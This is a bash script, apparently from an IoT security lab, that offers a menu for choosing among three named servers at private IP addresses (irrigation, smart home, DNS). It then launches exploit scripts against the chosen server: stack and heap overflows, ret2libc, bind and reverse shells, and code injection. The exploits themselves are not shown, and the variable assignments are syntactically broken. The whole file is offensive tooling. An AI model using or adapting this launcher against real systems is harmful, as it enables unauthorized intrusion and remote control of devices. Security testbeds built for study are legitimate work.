Attack()
{
	while true
	do
		echo ""
		echo "Please choose a particular attack..."
        	echo "	Stack overflow --> 1"
        	echo "	Ret2libc --> 2"
        	echo "	Heap overflow --> 3"
		echo "	Stack overflow (bind shell) --> 4"
		echo "	Heap Overflow (bind shell) --> 5"
		echo "	Stack overflow (reverse shell) --> 6"
		echo "	Heap Overflow (reverse shell) --> 7"
		echo "	Code injection attack --> 8"
		echo "	Select new server --> 9"


       		read input
        	case $input in
                	1) 
                        	$1/so.py $2 5555
                       		;;
               		2) 
                       		$1/ret2libc.py $2 5555
                       		;;
               		3) 
                       		$1/ho.py $2 5555
                      		;;
			4)
				$1/so_bind.py $2 5555
				;;
			5)
				$1/ho_bind.py $2 5555
				;;
			6)
				$1/so_rev.py $2 5555
				;;
			7)
				$1/ho_rev.py $2 5555
				;;
			8)
				$1/injecting_code.py $2 5555
				;;
			9)
				return
				;;
               		*) 
        			echo "Please choose a particular attack..."
       			 	echo "	Stack overflow --> 1"
	        		echo "	Ret2libc --> 2"
        			echo "	Heap overflow --> 3"
				echo "	Stack overflow (bind shell) --> 4"
				echo "	Heap Overflow (bind shell) --> 5"
				echo "	Stack overflow (reverse shell) --> 6"
				echo "	Heap Overflow (reverse shell) --> 7"
				echo "	Code injection attack --> 8"
				echo "	Select new server --> 9"
				;;
       		esac
	done
}



IRRIGATION_SERVER = "192.168.1.26"
SMARTHOME_SERVER = "192.168.1.27"
DNS_SERVER = "192.168.1.28"


while true
do
	echo "Please, choose a particular Server to EXPLOIT..."
        echo "	Irrigation Server --> 1"
        echo "	Smart Home --> 2"
	echo "	DNS server --> 3"
	echo "	exit from program -> 4"

	read program
	case $program in
		1)
			Attack ./IrrigationServer "192.168.1.26"
			;;

		2)
                	Attack ./smarthome "192.168.1.27"
                	;;
           
		3)
			Attack ./DNS_server_raspberrypi "192.168.1.28"
			;;
		4)
			exit 1
			;;

	esac
done
